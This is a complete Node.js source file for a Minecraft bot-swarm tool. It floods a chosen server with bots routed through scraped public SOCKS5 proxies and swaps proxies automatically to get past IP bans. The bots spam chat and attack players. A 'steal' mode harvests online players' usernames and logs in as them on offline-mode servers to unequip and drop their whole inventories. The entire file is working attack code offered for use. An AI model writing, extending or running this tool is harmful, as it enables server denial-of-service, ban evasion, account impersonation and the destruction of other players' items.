// === MINECRAFT SWARM AUTO-PROXY v10.1 ===
// Credits: Smile B
// GitHub: Smile-B14

'use strict'

const mineflayer = require('mineflayer')
const readline = require('readline')
const { pathfinder, Movements, goals: { GoalFollow, GoalNearXZ } } = require('mineflayer-pathfinder')
const { SocksProxyAgent } = require('socks-proxy-agent')
const https = require('https')

const CFG = {
  minJoinGap: 3800,
  maxJoinGap: 5600,
  followRadius: 40,
  followDistance: 2,
  hitDistance: 3.5,
  aiTick: 400,
  authPassword: 'SmileB12459',
  chatDelay: 1500 
}

// ANSI Colors for standard terminal
const c = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m"
}

const states = new Map()
const botNames = new Set()
const queue = []
let queueSeq = 0
let queueTimer = null
let nextConnectAt = 0

let aiEnabled = true
let hitEnabled = true
let logsEnabled = false
let spamTimer = null
let infiniteSpawn = false
let spawnInterval = null
let isStealMode = false

let maintainCount = 0

let targetHost = ''
let targetPort = null
let targetVersion = null
let customNames = []

const proxyPool = []
const deadProxiesGlobal = new Set()
const usedProxiesForServer = new Map()
const bannedProxiesForServer = new Map()

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const text = v => typeof v === 'string' ? v : JSON.stringify(v)

// Global crash preventers
process.on('uncaughtException', (err) => log(`${c.red}CRASH PREVENTED: ${err.message}${c.reset}`))
process.on('unhandledRejection', (err) => log(`${c.red}CRASH PREVENTED: ${err}${c.reset}`))

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

function log(msg) {
  readline.clearLine(process.stdout, 0)
  readline.cursorTo(process.stdout, 0)
  console.log(msg)
  rl.prompt(true)
}

async function askValid(question, validator) {
  while (true) {
    const res = await new Promise(resolve => rl.question(question, resolve))
    const err = validator(res.trim())
    if (err === true) return res.trim()
    console.log(`${c.red}Invalid input: ${err}${c.reset}`)
  }
}

async function initialSetup() {
  console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.1 ===${c.reset}`)
  console.log(`${c.magenta}Credits: Smile B${c.reset}\n`)
  
  const stealMode = await askValid('Enable Steal Player Mode initially? (y/n): ', (v) => v.toLowerCase() === 'y' || v.toLowerCase() === 'n' ? true : 'Please enter y or n.')
  if (stealMode.toLowerCase() === 'y') isStealMode = true

  targetHost = await askValid('Target Server IP: ', (v) => v.length > 2 ? true : 'IP cannot be blank or less than 3 characters.')
  
  const portText = await askValid('Port (blank = auto): ', (v) => {
    if (!v) return true
    const p = Number(v)
    if (!Number.isInteger(p) || p < 1 || p > 65535) return 'Port must be 1-65535.'
    return true
  })
  if (portText) targetPort = Number(portText)
  
  const versionText = await askValid('Version (blank = auto): ', (v) => true)
  if (versionText && versionText.toLowerCase() !== 'auto') targetVersion = versionText

  const countText = await askValid('How many bots to maintain? (0 = infinite spam): ', (v) => {
    const n = Number(v)
    if (!Number.isInteger(n) || n < 0) return 'Must be a positive number or 0.'
    return true
  })
  const count = parseInt(countText || '0')

  console.log(`\n${c.cyan}Fetching public SOCKS5 proxies...${c.reset}`)
  const fetched = await fetchProxies()
  proxyPool.push(...fetched)
  console.log(`${c.green}Auto-loaded ${proxyPool.length} SOCKS5 proxies.${c.reset}`)

  return count
}

// --- PROXY & MINEFLAYER LOGIC ---
async function fetchProxies() {
  return new Promise((resolve) => {
    https.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all', (res) => {
      let data = ''
      res.on('data', chunk => data += chunk)
      res.on('end', () => {
        try {
          const list = data.split('\r\n').filter(Boolean).map(p => {
            const [host, port] = p.split(':')
            if (host && port) return { host, port: parseInt(port), proxyUrl: `socks5://${host}:${port}` }
            return null
          }).filter(Boolean)
          resolve(list)
        } catch (e) { resolve([]) }
      })
    }).on('error', () => resolve([]))
  })
}

// Auto-refresh proxies every 60 seconds
setInterval(async () => {
  try {
    const fetched = await fetchProxies()
    let added = 0
    for (const p of fetched) {
      if (!proxyPool.find(x => x.proxyUrl === p.proxyUrl)) {
        proxyPool.push(p)
        added++
      }
    }
    if (added > 0) {
      log(`${c.cyan}Auto-refresh: Added ${added} new proxies. Total: ${proxyPool.length}${c.reset}`)
    }
  } catch (e) {}
}, 60000)

function getProxyForServer(serverHost) {
  const used = usedProxiesForServer.get(serverHost) || new Set()
  const banned = bannedProxiesForServer.get(serverHost) || new Set()
  const available = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl) && !banned.has(p.proxyUrl) && !used.has(p.proxyUrl))
  
  if (available.length === 0) {
    const recyclable = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl) && !banned.has(p.proxyUrl))
    if (recyclable.length > 0) return recyclable[Math.floor(Math.random() * recyclable.length)]
    const anyAlive = proxyPool.filter(p => !deadProxiesGlobal.has(p.proxyUrl))
    if (anyAlive.length > 0) return anyAlive[Math.floor(Math.random() * anyAlive.length)]
    return null
  }
  const proxy = available[Math.floor(Math.random() * available.length)]
  used.add(proxy.proxyUrl)
  usedProxiesForServer.set(serverHost, used)
  return proxy
}

function banProxy(serverHost, proxy, reason) {
  if (!proxy) return
  deadProxiesGlobal.add(proxy.proxyUrl)
  const banned = bannedProxiesForServer.get(serverHost) || new Set()
  banned.add(proxy.proxyUrl)
  bannedProxiesForServer.set(serverHost, banned)
  log(`${c.red}Proxy ${proxy.host}:${proxy.port} blacklisted (${reason}). Total dead: ${deadProxiesGlobal.size}${c.reset}`)
}

function generateRealisticName() {
  if (customNames.length > 0) {
    const name = customNames.shift()
    log(`${c.magenta}[Steal] Using stolen name: ${name}${c.reset}`)
    return name
  }
  const prefixes = ['xX', 'Itz', 'Pro', 'The', 'i', '_', 'Mr', 'Lil', 'xX_', 'The_']
  const names = ['Steve', 'Alex', 'Pixel', 'Block', 'Craft', 'Mine', 'Epic', 'God', 'Dark', 'Shadow', 'Cool', 'Smart', 'Sniper', 'Gamer', 'Noob', 'King', 'Boss', 'PvP', 'Slayer', 'Zombie', 'Creeper']
  const suffixes = ['Xx', '_Xx', 'YT', '99', '123', '_', 'Pro', 'GG', '420', '69', '777', 'x', '_']
  let name = ''
  const r = Math.random()
  if (r < 0.25) name = `xX${names[Math.floor(Math.random()*names.length)]}Xx`
  else if (r < 0.5) name = `${names[Math.floor(Math.random()*names.length)]}_${Math.floor(Math.random() * 9999)}`
  else if (r < 0.75) name = `${names[Math.floor(Math.random()*names.length)]}${suffixes[Math.floor(Math.random()*suffixes.length)]}`
  else name = `${prefixes[Math.floor(Math.random()*prefixes.length)]}${names[Math.floor(Math.random()*names.length)]}`
  if (Math.random() < 0.4 && name.length < 13) name += Math.floor(Math.random() * 999)
  name = name.replace(/[^A-Za-z0-9_]/g, '')
  if (name.length < 4) name += Math.floor(Math.random() * 9999)
  if (name.length > 16) name = name.substring(0, 16)
  return name
}

// --- STEAL MODE ---
async function stealPlayerNames(host, port) {
  return new Promise((resolve) => {
    log(`${c.magenta}[Steal] Connecting to ${host} to read player list...${c.reset}`)
    const tempName = generateRealisticName()
    const opts = { host, username: tempName, auth: 'offline', hideErrors: true }
    if (port) opts.port = port
    
    let bot
    try { bot = mineflayer.createBot(opts) }
    catch (e) { resolve([]); return }
    
    let resolved = false

    bot.on('messagestr', msg => {
      if (msg.includes('/register')) bot.chat(`/register ${CFG.authPassword} ${CFG.authPassword}`)
      if (msg.includes('/login')) bot.chat(`/login ${CFG.authPassword}`)
    })

    const finish = () => {
      if (resolved) return
      resolved = true
      const players = Object.keys(bot.players || {}).filter(p => p !== tempName)
      log(`${c.magenta}[Steal] Found ${players.length} players. Disconnecting...${c.reset}`)
      try { bot.quit() } catch {}
      resolve(players)
    }
    
    bot.once('spawn', () => setTimeout(finish, 5000))
    bot.on('end', finish)
    bot.on('error', (err) => {
      log(`${c.red}[Steal] Error: ${err.message}${c.reset}`)
      finish()
    })
    setTimeout(finish, 15000)
  })
}

function enqueue(state, delay = 0, reason = 'retry') {
  state.queued = true
  state.queueReason = reason
  queue.push({ state, readyAt: Date.now() + Math.max(0, delay), seq: queueSeq++ })
  scheduleQueue()
}

function scheduleQueue() {
  if (queueTimer) clearTimeout(queueTimer)
  queueTimer = null
  if (!queue.length) return
  const now = Date.now()
  const earliest = Math.min(...queue.map(x => x.readyAt))
  queueTimer = setTimeout(runQueue, Math.max(0, Math.max(earliest, nextConnectAt) - now))
}

function runQueue() {
  queueTimer = null
  if (!queue.length) return
  const now = Date.now()
  if (now < nextConnectAt) return scheduleQueue()

  const ready = queue.filter(x => x.readyAt <= now)
  if (!ready.length) return scheduleQueue()
  const entry = ready[0]
  queue.splice(queue.indexOf(entry), 1)
  entry.state.queued = false
  const joinDelay = CFG.minJoinGap + Math.random() * (CFG.maxJoinGap - CFG.minJoinGap)
  nextConnectAt = Date.now() + joinDelay
  try { connectBot(entry.state) } 
  catch (e) {
    log(`${c.red}Queue error: ${e.message}. Retrying...${c.reset}`)
    entry.state.proxy = getProxyForServer(targetHost)
    enqueue(entry.state, 3000, 'queue error retry')
  }
  scheduleQueue()
}

function findTarget(bot) {
  try {
    let target = bot.nearestEntity(e => e.type === 'player' && e.username && e.username !== bot.username && !botNames.has(e.username.toLowerCase()))
    if (!target) target = bot.nearestEntity(e => e.type === 'mob' && e.position)
    if (!target) target = bot.nearestEntity(e => e.type === 'animal' && e.position)
    return target
  } catch { return null }
}

// Fixed Drop All Items logic
async function dropAllItems(state) {
  try {
    const bot = state.bot
    if (!bot || !bot.inventory) return
    
    log(`${c.magenta}[${state.username}] Waiting 2s for inventory to load...${c.reset}`)
    await sleep(2000) 
    
    // 1. Unequip armor first
    await bot.unequip('head').catch(() => {})
    await bot.unequip('torso').catch(() => {})
    await bot.unequip('legs').catch(() => {})
    await bot.unequip('feet').catch(() => {})
    await sleep(500)
    
    // 2. Loop drop everything until inventory is empty
    let safety = 0
    while (bot.inventory.items().length > 0 && safety < 50) {
      const items = bot.inventory.items()
      for (const item of items) {
        try {
          await bot.tossStack(item)
          await sleep(100) // small delay so server doesn't lag
        } catch (e) {}
      }
      safety++
    }
    
    // 3. Spam drop key just in case anything is stuck on cursor
    bot.setControlState('drop', true)
    setTimeout(() => bot.setControlState('drop', false), 3000)
    
    log(`${c.magenta}[${state.username}] All items dropped!${c.reset}`)
  } catch (e) {}
}

function startAI(state) {
  try {
    if (state.aiTimer) clearInterval(state.aiTimer)
    const bot = state.bot
    if (!bot?.entity) return
    const movements = new Movements(bot)
    movements.canDig = true 
    movements.allow1by1towers = false
    movements.maxDropDown = 3
    bot.pathfinder.setMovements(movements)
  } catch (e) {}

  state.aiTimer = setInterval(async () => {
    try {
      if (!aiEnabled || !state.connected || !state.bot?.entity) return
      const bot = state.bot
      const target = findTarget(bot)
      
      if (target) {
        const d = bot.entity.position.distanceTo(target.position)
        if (d <= CFG.followRadius) {
          try { bot.pathfinder.setGoal(new GoalFollow(target, CFG.followDistance), true) } catch {}
          if (hitEnabled && d <= CFG.hitDistance && Date.now() - state.lastHit > (400 + Math.random() * 400)) {
            state.lastHit = Date.now()
            const offsetX = (Math.random() - 0.5) * 0.5
            const offsetY = (Math.random() - 0.5) * 0.5
            try {
              await bot.lookAt(target.position.offset(offsetX, 1.4 + offsetY, offsetX), true)
              bot.attack(target, true)
            } catch {}
          }
          return
        }
      } else {
        if (!bot.pathfinder.isMoving() && Math.random() < 0.3) {
          const x = bot.entity.position.x + (Math.random() * 20 - 10)
          const z = bot.entity.position.z + (Math.random() * 20 - 10)
          try { bot.pathfinder.setGoal(new GoalNearXZ(x, z, 2)) } catch {}
        }
        if (Math.random() < 0.1) {
          try { bot.setControlState('jump', true); setTimeout(() => bot.setControlState('jump', false), 300) } catch {}
        }
        if (Math.random() < 0.05) {
          try {
            const block = bot.blockAtCursor(4)
            if (block && block.name !== 'air' && block.name !== 'bedrock' && bot.canDigBlock(block)) {
              bot.dig(block).catch(() => {}) 
            }
          } catch {}
        }
      }
    } catch (e) {}
  }, CFG.aiTick)
}

function handleAuth(state, raw) {
  try {
    if (!state.connected) return
    const msg = String(raw || '').trim().toLowerCase()
    if (!msg) return
    if (msg.includes('/register') || msg.includes('please register')) {
      try { state.bot.chat(`/register ${CFG.authPassword} ${CFG.authPassword}`) } catch {}
    } else if (msg.includes('/login') || msg.includes('please login')) {
      try { state.bot.chat(`/login ${CFG.authPassword}`) } catch {}
    }
  } catch {}
}

function connectBot(state) {
  state.connecting = true
  const proxyTag = state.proxy ? `${c.yellow}[P]${c.reset}` : `${c.red}[D]${c.reset}`
  log(`${c.cyan}[${state.username}]${c.reset} ${proxyTag} Connecting to ${targetHost}...`)

  const opts = { host: targetHost, username: state.username, auth: 'offline', keepAlive: true, hideErrors: true, port: targetPort, version: targetVersion }
  if (state.proxy) {
    try { opts.agent = new SocksProxyAgent(state.proxy.proxyUrl) } 
    catch (e) {
      banProxy(targetHost, state.proxy, 'Agent Init Error')
      state.connecting = false
      state.proxy = getProxyForServer(targetHost)
      return enqueue(state, 1000, 'proxy init error retry')
    }
  }

  let bot
  try { bot = mineflayer.createBot(opts) }
  catch (err) {
    log(`${c.red}[${state.username}] CREATE ERROR: ${err.message}. Retrying...${c.reset}`)
    state.connecting = false
    state.proxy = getProxyForServer(targetHost)
    return enqueue(state, 5000, 'retry')
  }

  state.bot = bot
  try { bot.loadPlugin(pathfinder) } catch {}

  bot.once('spawn', () => {
    state.connecting = false
    state.connected = true
    log(`${c.green}[${state.username}] JOINED.${c.reset} Starting AI...`)
    startAI(state)
    if (state.isStolen) dropAllItems(state)
  })

  bot.on('messagestr', msg => {
    handleAuth(state, msg)
    if (logsEnabled) log(`${c.blue}[CHAT -> ${state.username}]${c.reset} ${msg}`)
  })

  bot.on('kicked', reason => {
    const reasonStr = text(reason).toLowerCase()
    log(`${c.red}[${state.username}] KICKED: ${text(reason)}${c.reset}`)
    
    if (reasonStr.includes('banned_ip') || reasonStr.includes('ip_banned') || reasonStr.includes('ip banned')) {
      log(`${c.yellow}[${state.username}] IP Ban detected. Swapping proxy and retrying...${c.reset}`)
      banProxy(targetHost, state.proxy, 'IP Banned by Server')
      state.proxy = getProxyForServer(targetHost) 
      enqueue(state, 2000, 'ip ban proxy swap') 
    } else if (reasonStr.includes('whitelist') || reasonStr.includes('not whitelisted') || reasonStr.includes('banned')) {
      log(`${c.red}[${state.username}] Stopping retries (Account Ban/Whitelist detected).${c.reset}`)
      state.permanentStop = true
    }
  })

  bot.on('error', err => {
    log(`${c.red}[${state.username}] ERROR: ${err.message}${c.reset}`)
    if (state.proxy && (err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT' || err.code === 'ECONNRESET' || err.message.includes('socks') || err.message.includes('proxy'))) {
      banProxy(targetHost, state.proxy, 'Connection Error')
    }
    
    state.connecting = false
    setTimeout(() => {
      if (!state.connected && !state.queued && !state.permanentStop) {
        log(`${c.yellow}[${state.username}] Connection stuck. Force retrying with new proxy...${c.reset}`)
        state.proxy = getProxyForServer(targetHost)
        enqueue(state, 1000, 'force error retry')
      }
    }, 2000)
  })

  bot.on('end', () => {
    try { if (state.aiTimer) clearInterval(state.aiTimer) } catch {}
    state.connected = false
    state.connecting = false
    state.bot = null
    
    if (!state.permanentStop && !state.queued) {
      state.proxy = getProxyForServer(targetHost)
      enqueue(state, 3000, 'retry')
    } else if (state.permanentStop) {
      states.delete(state.username.toLowerCase())
      botNames.delete(state.username.toLowerCase())
    }
  })
}

async function sendAll(message) {
  const online = [...states.values()].filter(s => s.connected && s.bot)
  for (const s of online) {
    try { s.bot.chat(message); await sleep(CFG.chatDelay) } catch {}
  }
  if (spamTimer) {
    log(`${c.magenta}[Spam] x${online.length} sent${c.reset}`)
  } else {
    log(`${c.magenta}Finished sending message to ${online.length} bots.${c.reset}`)
  }
}

function startSpam(message, interval) {
  if (spamTimer) clearInterval(spamTimer)
  spamTimer = setInterval(() => sendAll(message), interval)
  log(`${c.magenta}Spamming EVERY ${interval}ms.${c.reset}`)
}

function stopSpam() {
  if (spamTimer) { 
    clearInterval(spamTimer); spamTimer = null; 
    log(`${c.magenta}Spam stopped.${c.reset}`) 
  }
}

function startInfiniteSpawn() {
  if (infiniteSpawn) return
  infiniteSpawn = true
  maintainCount = 0
  log(`${c.yellow}Infinite spawn mode enabled. Generating bots continuously...${c.reset}`)
  spawnInterval = setInterval(() => {
    try {
      const name = generateRealisticName()
      if (!botNames.has(name.toLowerCase())) {
        botNames.add(name.toLowerCase())
        const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: false }
        states.set(name.toLowerCase(), state)
        enqueue(state, 0, 'infinite spawn')
      }
    } catch (e) {}
  }, 1500)
}

function stopSpawn() {
  if (spawnInterval) clearInterval(spawnInterval)
  infiniteSpawn = false
  log(`${c.yellow}Infinite spawn stopped. Existing bots will remain.${c.reset}`)
}

function stopJoin() {
  if (spawnInterval) clearInterval(spawnInterval)
  infiniteSpawn = false
  maintainCount = 0
  queue.length = 0 
  log(`${c.yellow}Queue cleared. No new bots will join. Online bots will stay.${c.reset}`)
}

function addBots(count) {
  if (count === 0) {
    startInfiniteSpawn()
  } else {
    maintainCount += count
    for (let i = 0; i < count; i++) {
      const name = generateRealisticName()
      botNames.add(name.toLowerCase())
      const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: customNames.length > 0 }
      states.set(name.toLowerCase(), state)
      enqueue(state, 0, 'added via cmd')
    }
    log(`${c.cyan}Generating ${count} new bots. Target total: ${maintainCount}${c.reset}`)
  }
}

// Instantly steal a specific username
function stealSpecificName(username) {
  log(`${c.magenta}[Steal] Instantly stealing username: ${username}${c.reset}`)
  botNames.add(username.toLowerCase())
  const state = { 
    username: username, 
    bot: null, 
    connected: false, 
    connecting: false, 
    queued: false, 
    intentionalStop: false, 
    permanentStop: false, 
    lastHit: 0, 
    proxy: getProxyForServer(targetHost), 
    isStolen: true 
  }
  states.set(username.toLowerCase(), state)
  enqueue(state, 0, 'steal username')
}

// Auto-replenish bots if they get banned/disconnected
setInterval(() => {
  if (maintainCount > 0 && !infiniteSpawn) {
    let aliveBots = 0
    for (const s of states.values()) {
      if (!s.permanentStop) aliveBots++
    }
    if (aliveBots < maintainCount) {
      const needed = maintainCount - aliveBots
      log(`${c.yellow}Maintaining count: Replacing ${needed} lost bot(s).${c.reset}`)
      for (let i = 0; i < needed; i++) {
        const name = generateRealisticName()
        botNames.add(name.toLowerCase())
        const state = { username: name, bot: null, connected: false, connecting: false, queued: false, intentionalStop: false, permanentStop: false, lastHit: 0, proxy: getProxyForServer(targetHost), isStolen: customNames.length > 0 }
        states.set(name.toLowerCase(), state)
        enqueue(state, 0, 'replacement')
      }
    }
  }
}, 5000)

async function handleStealCommand(args) {
  if (!args) return log(`${c.red}Use: steal on/off OR steal <username>${c.reset}`)
  
  if (args === 'on') {
    isStealMode = true
    log(`${c.magenta}[Steal] Mode ON. Pausing queue to scan server...${c.reset}`)
    stopJoin()
    customNames = await stealPlayerNames(targetHost, targetPort)
    if (customNames.length === 0) {
      log(`${c.red}[Steal] Failed to read players. Use random names instead.${c.reset}`)
      isStealMode = false
    } else {
      log(`${c.green}[Steal] Successfully stole ${customNames.length} names! Type 'add 10' to spawn them.${c.reset}`)
    }
  } else if (args === 'off') {
    isStealMode = false
    customNames = []
    log(`${c.magenta}[Steal] Mode OFF. Future bots will use random names.${c.reset}`)
  } else {
    // If it's not on/off, treat it as a username to steal instantly
    stealSpecificName(args)
  }
}

function handleInput(input) {
  try {
    const space = input.indexOf(' ')
    const cmd = (space < 0 ? input : input.slice(0, space)).toLowerCase()
    const rest = space < 0 ? '' : input.slice(space + 1).trim()

    if (cmd === 'add') {
      const n = parseInt(rest)
      if (isNaN(n) || n < 0) log(`${c.red}Use: add <number> (0 for infinite)${c.reset}`)
      else addBots(n)
    }
    else if (cmd === 'spam') {
      const p = rest.indexOf(' ')
      if (p < 0) log(`${c.red}Use: spam <interval_ms> <message> (Example: spam 5000 Hello)${c.reset}`)
      else {
        const interval = parseInt(rest.slice(0, p))
        if (isNaN(interval) || interval < 1000) log(`${c.red}Interval must be a number >= 1000. Example: spam 5000 Hello${c.reset}`)
        else startSpam(rest.slice(p + 1).trim(), interval)
      }
    }
    else if (cmd === 'stopspam') stopSpam()
    else if (cmd === 'stopspawn') stopSpawn()
    else if (cmd === 'stopjoin') stopJoin()
    else if (cmd === 'steal') handleStealCommand(rest.toLowerCase())
    else if (cmd === 'ai') { aiEnabled = rest === 'on'; log(`${c.yellow}AI ${aiEnabled ? 'ON' : 'OFF'}${c.reset}`) }
    else if (cmd === 'hit') { hitEnabled = rest === 'on'; log(`${c.yellow}Hitting ${hitEnabled ? 'ON' : 'OFF'}${c.reset}`) }
    else if (cmd === 'logs') { logsEnabled = rest === 'on'; log(`${c.yellow}Logs ${logsEnabled ? 'ON' : 'OFF'}${c.reset}`) }
    else if (cmd === 'help') {
      console.log(`\n${c.cyan}=== BOT CONTROL ===${c.reset}`)
      console.log(` list                      -> Shows how many bots are online/connecting`)
      console.log(` add <count>               -> Spawns more bots (0 for infinite)`)
      console.log(` stopjoin                  -> Stops ALL pending bots from joining`)
      console.log(` spam <ms> <message>       -> Bots spam chat. Example: spam 5000 Hello!`)
      console.log(` stopspam                  -> Stops the chat spam`)
      console.log(` steal on/off              -> Scans whole server and steals all usernames`)
      console.log(` steal <username>          -> Instantly joins with a specific username to drop items`)
      console.log(` ai on | ai off            -> Toggles all movement and attacking`)
      console.log(` hit on | hit off          -> Toggles attacking players/mobs`)
      console.log(` logs on | logs off        -> Toggles server chat logging in console`)
      console.log(` quit                      -> Disconnects all bots and exits\n`)
    }
    else if (cmd === 'list') {
      let online = 0, connecting = 0
      for (const s of states.values()) {
        if (s.connected) online++
        else if (s.connecting) connecting++
      }
      log(`${c.cyan}Total: ${states.size} | Online: ${online} | Connecting: ${connecting} | Dead Proxies: ${deadProxiesGlobal.size} | Maintain Target: ${maintainCount === 0 ? 'INF' : maintainCount}${c.reset}`)
    }
    else if (cmd === 'quit') {
      log(`${c.red}Disconnecting all...${c.reset}`)
      for (const s of states.values()) { try { s.bot?.quit() } catch {} }
      setTimeout(() => process.exit(0), 500)
    }
    else log(`${c.red}Unknown command. Type 'help'${c.reset}`)
  } catch (e) {
    log(`${c.red}Command error: ${e.message}${c.reset}`)
  }
}

async function main() {
  try {
    const initialCount = await initialSetup()
    
    console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.1 ===${c.reset}`)
    console.log(`${c.magenta}Credits: Smile B${c.reset}`)
    console.log(`${c.green}Auto-loaded ${proxyPool.length} SOCKS5 proxies.${c.reset}`)
    console.log(`${c.cyan}Proxies will auto-refresh every 60 seconds.${c.reset}`)
    
    if (isStealMode) {
      console.log(`${c.magenta}[Steal] Scanning server for initial names...${c.reset}`)
      customNames = await stealPlayerNames(targetHost, targetPort)
      if (customNames.length > 0) {
        console.log(`${c.green}[Steal] Stole ${customNames.length} names!${c.reset}`)
      } else {
        console.log(`${c.red}[Steal] Failed. Using random names.${c.reset}`)
        isStealMode = false
      }
    }
    
    addBots(initialCount) 
    console.log(`${c.green}Setup complete! Type 'help' to see commands.\n${c.reset}`)
    
    rl.setPrompt('BOT > ')
    rl.prompt()
    rl.on('line', (input) => {
      handleInput(input.trim())
      rl.prompt()
    })
    
  } catch (err) {
    console.error('Fatal startup error:', err)
    process.exit(1)
  }
}

main()
